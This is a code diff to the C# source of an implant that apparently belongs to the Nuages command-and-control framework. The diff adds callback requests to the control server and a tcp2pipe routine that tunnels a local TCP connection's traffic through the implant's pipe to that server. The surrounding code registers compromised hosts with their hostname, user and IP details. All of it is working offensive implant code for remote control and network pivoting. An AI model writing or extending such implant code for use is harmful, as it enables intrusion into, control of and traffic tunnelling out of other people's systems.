@@ -2,6 +2,8 @@
 using System.Collections.Generic;
 using System.IO;
 using System.Json;
+using System.Net;
+using System.Net.Sockets;
 using System.Security.Policy;
 using NuagesSharpImplant.Connections;
 
@@ -107,6 +109,26 @@ namespace NuagesSharpImplant
             this.POST("jobresult", body.ToString());
         }
 
+
+        public JsonObject Callback(string callback, JsonObject data)
+        {
+            List<KeyValuePair<string, JsonValue>> list = new List<KeyValuePair<string, JsonValue>>();
+            list.Add(new KeyValuePair<string, JsonValue>("callback", callback));
+            list.Add(new KeyValuePair<string, JsonValue>("data", data));
+            JsonObject body = new JsonObject(list);
+            return (JsonObject)JsonValue.Parse(this.POST("callback", body.ToString()));
+        }
+
+        public JsonObject Callback(string callback, JsonObject data, string runId)
+        {
+            List<KeyValuePair<string, JsonValue>> list = new List<KeyValuePair<string, JsonValue>>();
+            list.Add(new KeyValuePair<string, JsonValue>("callback", callback));
+            list.Add(new KeyValuePair<string, JsonValue>("data", data));
+            list.Add(new KeyValuePair<string, JsonValue>("runId", runId));
+            JsonObject body = new JsonObject(list);
+            return (JsonObject)JsonValue.Parse(this.POST("callback", body.ToString()));
+        }
+
         public string RegisterImplant(string type = "", string hostname = "", string username = "", string localIp = "", string sourceIp = "", string os = "", string handler = "", string connectionString = "", Dictionary<string, string> config = null, String[] supportedPayloads = null)
         {
 
@@ -193,6 +215,60 @@ namespace NuagesSharpImplant
                 {
                     POSTPipe(pipe_id, buffer, 0);
                     System.Threading.Thread.Sleep(this.getRefreshRate());
+                }
+            }
+        }
+
+        public void tcp2pipe(TcpClient tcpClient, string pipe_id)
+        {
+            MemoryStream memStream;
+            NetworkStream cliStream = tcpClient.GetStream();
+            byte[] outbuff = new byte[this.getBufferSize()];
+            int refreshRate = this.getRefreshRate();
+            IAsyncResult outReadop = cliStream.BeginRead(outbuff, 0, outbuff.Length, null, null);
+            int outBytesRead;
+            byte[] inbuff;
+            try
+            {
+                while (tcpClient.Connected)
+                {
+                    outBytesRead = 0;
+                    memStream = new MemoryStream();
+                    if (outReadop.IsCompleted)
+                    {
+                        outBytesRead = cliStream.EndRead(outReadop);
+                        if (outBytesRead != 0)
+                        {
+                            memStream.Write(outbuff, 0, outBytesRead);
+                            outReadop = cliStream.BeginRead(outbuff, 0, outbuff.Length, null, null);
+                        }
+                    }
+                    if (outBytesRead > 0)
+                    {
+                        inbuff = this.PipeReadWrite(pipe_id, memStream.ToArray());
+                        memStream.Dispose();
+                    }
+                    else
+                    {
+                        inbuff = this.PipeRead(pipe_id);
+                    }
+                    if (inbuff.Length > 0)
+                    {
+                        cliStream.Write(inbuff, 0, inbuff.Length);
+                    }
+                    System.Threading.Thread.Sleep(refreshRate);
+                }
+            }
+            catch (WebException ex)
+            {
+                if (ex.Status == WebExceptionStatus.ProtocolError && ex.Response != null)
+                {
+                    var resp = (HttpWebResponse)ex.Response;
+                    if (resp.StatusCode == HttpStatusCode.NotFound)
+                    {
+                        tcpClient.Close();
+                        return;
+                    }
                 }
             }
         }
